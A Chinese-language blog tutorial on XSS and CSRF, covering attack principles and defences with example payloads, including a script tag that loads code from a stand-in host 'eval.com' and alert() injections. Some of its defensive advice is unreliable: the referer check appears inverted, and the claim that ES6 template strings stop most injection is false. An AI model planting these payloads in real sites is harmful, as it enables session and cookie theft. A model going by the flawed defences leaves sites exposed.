---
title: 啥是XSS和CSRF?
date: 2019-04-18 18:18:49
tags: HTTP
dir: HTTP
---

本文通过介绍、原理、防御来讲解XSS以及CSRF。主要介绍及讲解攻击原理，及防御原理。

# 啥是XSS？

## XSS(Cross-site scripting)介绍

以下是**Wikipedia**及**MDN**对XSS的介绍
> Wikipedia:
>
> **跨网站指令码**（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。
>
> **XSS**攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。
>
> MDN:
>
> 跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者

**划重点： 网站漏洞、HTML、脚本、恶意注入、获取权限**

**总结：跨站脚本攻击用户加载恶意脚本，用户信息及权限等被恶意获取**

## XSS原理

被攻击的通常分为两种类型：**存储型XSS、反射型XSS**

### 存储型XSS原理

> 注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。

下面看一个例子：

```
// html 评论
<input name="comment" id="comment" value="<script src='http://eval.com'></script>"/>

// db
insert into table value("<script src='http://eval.com'></script>")

// 步骤
1、恶意用户将评论带一个script标签，script带有恶意攻击，例如获取页面cookies
2、评论被添加进数据库
3、用户都可以看见评论，并加载一个script
4、恶意script盗取用户信息
```

**总结：存储型XSS将恶意代码存储进数据库，用户加载恶意脚本时，恶意脚本将会从服务器上传回并执行**

### 反射型XSS原理

>  当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。

下面看一个例子：

```
// url
http://example.com?search=value'<script src="http://eval.com"></script>'

// html
<input value=window.location.search>

// 步骤
1、网页内嵌值由参数直接传入
2、恶意攻击者将参数包含script标签，加载恶意脚本
3、恶意脚本在网页中生效，盗取用户信息
```

**总结：反射型XSS是通过链接参数或表单，通过点击链接、注入恶意脚本，网页加载后，恶意脚本将会执行**

## XSS防御

### XSS注入点

在防御之前应该了解XSS有哪些注入点，其中包括HTML节点、HTML属性、JavaScript代码以及富文本

#### HTML节点

html节点包含用户输入内容，节点内容包含脚本

```
// HTML
<div>${content}</div>
// 用户输入，将content内容替换为<script>alert(1)</script>
<div><script>alert(1)</script></div>
```

#### HTML属性

```
// HTML
<img src="${src}">
// 用户输入，将src替换为 2" onerror="alert(2)
<img src="2" onerror="alert(2)">
```

#### JavaScript代码

```
// JS
<script>
	var data = "${data}"
</script>
// 用户输入，将data替换为 hello";alert(3); var a = "
<script>
	var data = "hello"; alert(3);var a = ""
</script>
```

#### 富文本

由于富文本需要保留html的原因，因此本身会有xss风险

### XSS分析及防御

了解攻击原理后，防御自然而然的也水到渠成了

#### 浏览器自带防御

浏览器自带一些防御能力，只能防御 XSS 反射类型攻击，且只能防御HTML属性

防御原理是将可能会执行脚本的标签或属性进行转义和过滤。

#### HTML节点内容及属性防御

将<和>转译成&lt &gt，将单引号，双引号，&及空格等转译

```
// HTML
<div>${content}</div>
// 用户输入<script>alert(1)</script>后进行转译，将<>进行转译&ltscript&gtalert(1)&lt/script&gt
<div>&ltscript&gtalert(1)&lt/script&gt</div>
```

####  Javascript代码防御

使用JSON.stringify

```
// JS
<script>
	var data = "${data}"
</script>
// 用户输入，将data替换为 hello";alert(3); var a = ",使用JSON.stringify(hello";alert(3); var a = ")
// 对输入内容会出现转译错误，结束操作
```

#### 富文本防御

按照白名单保留部分标签和属性

```
var whiteList = {
    "img":["src"],
    "a":["href"],
    "font":["color","size"]
};
html.forEach(node => {
    // 过滤白名单
})
```

最佳方式使用第三方[js-xss](https://github.com/leizongmin/js-xss)白名单进行过滤

### XSS攻击防御总结：

* XSS是通过加载第三方脚本进行攻击
* XSS攻击类型有存储型和反射型
* XSS注入点包括HTML节点、HTML属性、JavaScript代码以及富文本
* XSS防御通过浏览器自带防御、标签转译、JS代码JSON.stringify及白名单过滤进行防御

# 啥又是CSRF？

## CSRF(Cross Site Request forgery)介绍

以下是**Wikipedia**及**MDN**对CSRF的介绍

> Wikipedia:
>
> **跨站请求伪造**（英语：Cross-site request forgery），也被称为 **one-click attack** 或者 **session riding**，通常缩写为 **CSRF** 或者 **XSRF**， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法
>
> MDN:
>
> 跨站请求伪造（CSRF）是一种冒充受信任用户，向服务器发送非预期请求的攻击方式

**划重点：跨站请求伪造、冒充受信任用户、发送非预期请求**

**总结：CSRF是通过冒充用户来达到攻击目的的方式**

## CSRF原理

CSRF可以通过请求，携带用户登录态，伪造请求。在用户不知情的情况下，可利用用户身份完成业务请求

```
   www.a.com后端
	  ||\       |\
   1||2          \  3
   \||             \
www.a.com前端         www.b.com

1、用户登陆A网站
2、A网站确认身份
3、B网站页面向A网站发起请求（带A网站身份）
```

## CSRF分析及防御

### CSRF原理分析

B网站向A网站发起攻击原理：
* B网站向A网站请求
* 携带A网站Cookie
* 不访问A网站前端
* 请求的referer为B网站

### CSRF防御

CSRF的核心原理即：1、不直接访问A网站前端，而是通过B访问A，则可以通过**禁止使用第三方带来cookies，增加验证码、token机制**。2、B网站访问A网站，故所携带的referer为B网站。则可以通过**验证referer，禁止来自第三方请求**
#### 禁止第三方网站带来cookies

通过Cookie的SameSite禁止第三方访问

```
Set-Cookie: key=value; path=/; SameSite
```

由于SameSite兼容问题，对于大部分版本低的浏览器和部分浏览器不予支持。在使用中需考虑是否由于低版本问题而不生效，但SameSite不会因版本过低而报错，因此可放心使用

详细[Cookie](http://blog.gdccwxx.com/2019/04/09/basic-cookies/)可点击查看

#### 增加验证码，token

由于生效机制是B网站访问A网站携带Cookie即获得信任，则可以通过增加必须操作时带入验证码及本地token携带

#### 验证referer，禁止来自第三方的请求

```
// koa
let referer = ctx.request.headers.referer
if (/^https?:\/\/example.com/.test(referer)) {
  // error
}
```

第三方访问的referer是第三方页面请求的referer，而非本身服务器请求的referer

在判断第三方请求时，可使用正则表达式



## CSRF攻击防御总结

* CSRF攻击主要是恶意网站访问已经具有登录态的网站
* 通过携带A网站的Cookie，以用户身份进行业务操作
* 攻击原理的核心要点是不直接访问登录态网站及referer为攻击者网站
* 防御核心原理是禁止第三方携带Cookie进行请求、增加验证码、token机制、验证referer及禁止第三方请求

# 总结

XSS和CSRF是常见的Web攻防，攻击者通过注入或伪装进行攻击。XSS防御可通过es6模版字符串解决大部分注入问题；CSRF则不使用简单Cookie作为登录态唯一凭证，禁止第三方请求杜绝绝大部分问题。